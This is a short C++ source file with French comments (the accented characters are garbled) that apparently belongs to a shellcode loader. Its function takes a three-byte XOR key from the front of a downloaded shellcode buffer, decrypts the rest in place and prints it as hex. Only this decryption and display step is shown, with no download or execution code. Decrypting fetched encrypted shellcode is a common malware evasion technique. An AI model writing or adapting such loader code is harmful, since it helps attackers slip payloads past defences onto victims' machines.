#include "chiffrement.h"
#include <iostream>
#include <iomanip>

// D�chiffre le shellcode t�l�charg�
void decrypt_shellcode(char* shellcode, size_t size) {

    // R�cup�rer la cl� � partir des trois premiers caract�res du shellcode
    unsigned char key[3];
    key[0] = (unsigned char)shellcode[0];
    key[1] = (unsigned char)shellcode[1];
    key[2] = (unsigned char)shellcode[2];

    // Le reste du shellcode est crypt�
    char* encryptedPayload = shellcode + 3; // Le reste du shellcode chiffr�
    size_t decryptedSize = size - 3; // Taille du shellcode d�chiffr�

    // D�chiffrement XOR sur le reste du shellcode
    for (size_t i = 0; i < decryptedSize; ++i) {
        encryptedPayload[i] ^= key[i % 3]; // D�chiffrement XOR directement sur le tableau
    }

    //// Afficher le shellcode d�chiffr� en hexad�cimal
    //std::cout << "Shellcode d�chiffr� :\n";
    //for (size_t i = 0; i < decryptedSize; ++i) {
    //    std::cout << "\\x" << std::setw(2) << std::setfill('0') << std::hex << (int)(unsigned char)encryptedPayload[i];
    //}
    //std::cout << std::endl;

    std::cout << "Shellcode t�l�charg� (en hexad�cimal) :\n";
    for (size_t i = 0; i < decryptedSize; ++i) {
        printf("%02X ", (unsigned char)encryptedPayload[i]);
        if ((i + 1) % 16 == 0) { // Affiche 16 octets par ligne
            printf("\n");
        }
    }
    printf("\n");
}